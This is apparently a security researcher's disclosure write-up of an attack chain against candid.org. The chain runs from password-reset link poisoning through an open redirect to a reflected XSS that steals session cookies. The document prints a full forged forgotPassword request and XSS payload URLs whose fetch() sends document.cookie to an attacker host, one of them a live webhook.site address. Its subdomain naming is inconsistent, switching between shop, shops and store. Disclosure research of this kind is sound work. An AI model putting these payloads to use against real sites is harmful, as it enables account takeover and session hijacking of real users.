# Initial vector discovery and use-case (CWE-200, CWE-346)
Password reset link poisoning via attacker controlled baseUrl leads to reset token exposure and possible account takeover:

https://github.com/user-attachments/assets/39110aa1-3b91-4ca0-865c-9f1271cc635f

The forgot-password endpoint trusts a user supplied baseUrl when generating reset links. This allows an attacker to trigger a legitimate password reset email to a victim that contains an attacker controlled link. When clicked, the victim’s browser sends the victim’s email and reset token to the attacker’s domain: 
**https://[attacker controled domain]/?email=[victim email]&token=[victim token]** 
thus allowing the attacker to reuse the token on the legitimate reset-password page: 
**https://app.candid.org/reset-password?email=[victim email]&token=[victim token]**
Allowing flawless account takeover.

# How this vulnerability was initially resolved and why the resolution was only a temporary work around
The initial fix only restricted the supplied baseUrl to just app.candid.org, which did block the original technique of replacing the baseUrl domain with a domain controlled by the attacker, directly sending that domain with the reset email directly attaching the victim reset token to the malicious base domain and leaking the reset token when the victim clicked their special reset url.  
However, the attacker could still control the path and query parameters within that permitted domain. At that point I thought this was a direct lead/path to another vulnerability, only to realize a couple hours later this time the path of attack wouldn't be handed to me again on a golden platter like it had been the first time. I knew that I was going to have to find an open redirect on the same subdomain for this vector to still be utilized. 
I really did not expect it to happen after a certain point, but then after probably maybe the span of a month of spending time off and on hunting this open redirect I finally found it. 
I could now use the email reset link to target a redirect towards /user/saml with an attacker controlled samlEndpoint. 
The link therefore began on Candid’s permitted domain, but could still send the recipient’s browser to the attacker’s server (the full PoC is explained in depth at the end of this post but that is the jist of why the implemented resolution wasn't a full patch of the vector itself). 
That's when I knew the vector was still very capable of causing some damage, the hard part was over, basically. I say basically because the time consuming part should have been open but even with this set-up, the perfect layup from the Open redirect, I still tried taking advantage of the possibility of getting that token to leak again. Which was just objectively impossible to do with the circumstances/and attack paths I had to work with at that point, so I spent way too long trying to find zerodays in all the things I knew were set in stone as far as behavior goes. I just wanted that perfect, clean, one step token leak again, the yearn for that feeling won for a little while, maybe a day or two, despite me knowing that to make this work it was only a few more steps to get a near same result and regardless I would get a similar feeling once that result was met.  
After burning myself out in that pursuit, then coming back, I quickly within the same day of beginning again found an XSS on a seperate subdomain 'shop.candid.org' that used session cookies on the base domain, candid.org, and stored them without setting httponly to True. 

# The result of this work-around was...
A persistent vector that was ignored, which although it was no longer able to be 
utilized poking the same vulnerability, it was still in fact useful, but it just took 
finding a new path of attack for it to be useful again.

Admitably, the new "end result" relied upon a number of moving pieces making it much more
of a long winded process. So the patch did temporarily subdue the vector's strength, but
that's the issue: it wasn't stomped out and fully eliminated before being accepted
as a production ready resolution. Water was thrown on the flame but the embers were ignored,
left still sitting to build up to an inevitable outcome that was bound, fated to occur within
a matter of time. 

#Embers to flame, to embers again, then back again sparked to flame

https://github.com/user-attachments/assets/e653bde8-ef79-4a23-9cda-2356d4b63f44

https://github.com/user-attachments/assets/78e361c8-4ea0-44e7-9e40-ef9ce09d02e0

https://github.com/user-attachments/assets/4ef9ad9a-90e6-4499-bc6f-66072edd5a2d

# Written PoC of full attack chain process from start to session hijack
# app.candid.org Password Reset Poisoning to Session Hijacking via Open Redirect and XSS on store.candid.org

Estimate of this attack chain's severity:
- Critical range of 9.0-9.3:  
	 **CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N;**
- Reasoning:  
>	**AV:N** - remotely exploitable over the internet.  
>	**AC:L** - once the the actual chain is constructed/prepared the complexity is low (ie not dependent on winning a timing, bypassing randomization, prediction of randomization, using rare browser configurations, or relying on any kind of specific unstable conditions)  
>	**PR:N** - attacker does not need an authenticated session.  
>	**UI:R** - victim must click the reset link from their email inbox.  
>	**S:C** - Successful exploitation impacts a security authority beyond the component initially accepting the manipulated password-reset request. The chain begins on `app.candid.org` and ultimately affects the victim’s authenticated session on `shop.candid.org`.
>	**C:H** - attacker can access the victim’s private account information.  
>	**I:H** - attacker can perform authenticated actions as the victim.  
>	**A:N** - no availability impact demonstrated.
##### Relevant Vulnerabilities that Facilitate This Chain:
**app.candid.org**
- **CWE-640:** Password reset link poisoning issue in POST request to forgotPassword api by manipulating baseUrl parameter
	- Although entire domain poisoning is no longer possible on the reset link (baseUrl is required to stay on the subdomain app.candid.org), directory manipulation is still possible:
	- baseUrl=app.candid.org/*
		- e.g., baseUrl=app.candid.org/user/saml?samlEndpoint=
- **CWE-601:** URL Redirection to Untrusted Site
	- Url Redirection to untrusted sites is possible on subdomain app.candid.org through the '/user/saml?samlEndpoint=' endpoint by manipulating the 'samlEndpoint' parameter value
		- e.g., samlEndpoint=https://evil.site

**store.candid.org**
- **CWE-79:** Improper Neutralization of Input During Web Page Generation
	- Reflected Cross Site Scripting is possible on subdomain store.candid.org on the '/Subscriptions/candid-ultimate?cartId=' endpoint by escaping the cartId parameter value's context to inject payloads into the HTML source that trigger on page render. 
		- e.g., cartId=**%22%3E%3C/script%3E%3Csvg/onload=alert(document.domain)%3E**
- **CWE-1004:** Sensitive Cookie Without `HttpOnly` Flag
	- Sensitive session identifying cookies on store.candid.org are not set to HttpOnly allowing them to be read and easily abused, especially in cases where code injection is possible
		- e.g., sid, sid_Client, oid, \_\_Secure-has-sid cookies
### Attack Chain Overview:
#### Initial /forgotPassword POST (fetch)
```
await fetch("https://app.candid.org/api/v1/forgotPassword", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "X-API-Key": "Not Implemented Yet",
        "sentry-trace": "53421194fa81484d881fe267b2e2fb47-9b5b218aff4a082d-1",
        "baggage": "sentry-environment=production,sentry-release=production%3A%201.1784726846.0,sentry-public_key=abeea7b772494e2c98977f6ac8c3f48a,sentry-trace_id=53421194fa81484d881fe267b2e2fb47,sentry-sample_rate=1,sentry-sampled=true",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    },
    "referrer": "https://app.candid.org/forgot-password",
    "body": "{\"email\":\"<VICTIM_EMAIL@victim.mail>\",\"baseUrl\":\"https://app.candid.org/user/saml?samlEndpoint=<https://ATTACKER.SERVER/>\"}",
    "method": "POST",
    "mode": "cors"
});
```
- Powershell:
- <img width="984" height="550" alt="image" src="https://github.com/user-attachments/assets/ac6e2697-0b34-43ba-8257-6fcf4924be3e" />
- baseUrl parameter manipulation
	- **https://app.candid.org/user/saml?samlEndpoint=<https://ATTACKER.SERVER/>**
- Open redirect utilizing  'app.candid.org/user/saml?samlEndpoint=' endpoint:
	- The **samlEndpoint**  parameter allows you to adjust it's value to any domain, allowing you to direct the saml POST request to a server that you control:
		- https://app.candid.org/user/saml?samlEndpoint=https://ATTACKER.SERVER/
		  <img width="1184" height="504" alt="image" src="https://github.com/user-attachments/assets/27b3251d-860c-4cbe-aef2-70e7c6ebf936" />
      <img width="1172" height="646" alt="image" src="https://github.com/user-attachments/assets/eda0eb10-aefe-4b9a-b873-30aed4a86adc" />
      	- This also serves as an Open Redirect
#### Password reset email received by victim: 
<img width="1020" height="582" alt="image" src="https://github.com/user-attachments/assets/be25eac4-b70f-486a-bda7-dc15e23f09b9" />
<img width="608" height="535" alt="image" src="https://github.com/user-attachments/assets/cb32e2ad-dcfa-434a-9f17-e926701e1d9d" />
#### Attacker server
##### https://app.candid.org/user/saml?samlEndpoint=https://ATTACKER.SERVER/
- Attacker server HTML contents:
- <img width="1014" height="341" alt="image" src="https://github.com/user-attachments/assets/ee347d1e-5b7a-4f68-a015-25df7d1885b1" />

Attacker server redirects victim to vulnerable **shops.candid.org** endpoint (localhost used here for attacker server):
- https://shop.candid.org/Subscriptions/candid-ultimate?cartId=%22%3E%3C/script%3E%3Csvg/onload='fetch(%22https://localhost:8443/%22,{method:%22POST%22,mode:%22no-cors%22,headers:{%22Content-Type%22:%22text/plain%22},body:document.cookie})'%3E
%22%3E%3C/script%3E%3Csvg/onload='fetch(%22https://96901a02-44b1-4ed3-a504-58daee984d15.webhook.site/?=/%22,{method:%22POST%22,mode:%22no-cors%22,headers:{%22Content-Type%22:%22text/plain%22},body:document.cookie})'%3E



  - XSS Example: 
	  - https://shop.candid.org/Subscriptions/candid-ultimate?cartId=%22%3E%3C/script%3E%3Csvg/onload=alert(document.domain)%3E
    - <img width="870" height="211" alt="image" src="https://github.com/user-attachments/assets/713f6bb6-1ef3-4167-80d7-d552b1d55708" />
    	  - HTML Source Lines 900-912:
      <img width="1420" height="545" alt="image" src="https://github.com/user-attachments/assets/1be48953-9ca9-4837-afaf-ff3cb7b7de2e" />
#### Attack chain  
- Attacker sends forgotPassword POST with manipulated baseUrl
- Victim receives the link 'https://app.candid.org/user/saml?samlEndpoint=https://ATTACKER.SERVER/' through email 
- Victim clicks link which redirects them to the attacker controlled server, which then directs them to the XSS vulnerable shop.candid.org endpoint: 'https://shop.candid.org/Subscriptions/candid-ultimate?cartId=%22%3E%3C/script%3E%3Csvg/onload='fetch(%22https://localhost:8443/%22,{method:%22POST%22,mode:%22no-cors%22,headers:{%22Content-Type%22:%22text/plain%22},body:document.cookie})'%3E'
- After landing at that endpoint, victim session cookies are exfiltrated to the attacker server through a POST request made with fetch:
- <img width="1136" height="619" alt="image" src="https://github.com/user-attachments/assets/e776252d-8b67-4579-a63a-00d0b7674fa6" />
- Granting the attacker access to the victim clients session on shop.candid.org through multiple session related cookies being set as HttpOnly=false, particularly:
- <img width="226" height="106" alt="image" src="https://github.com/user-attachments/assets/79af0f1b-7059-4b7c-97f7-71633ecbbd57" />




















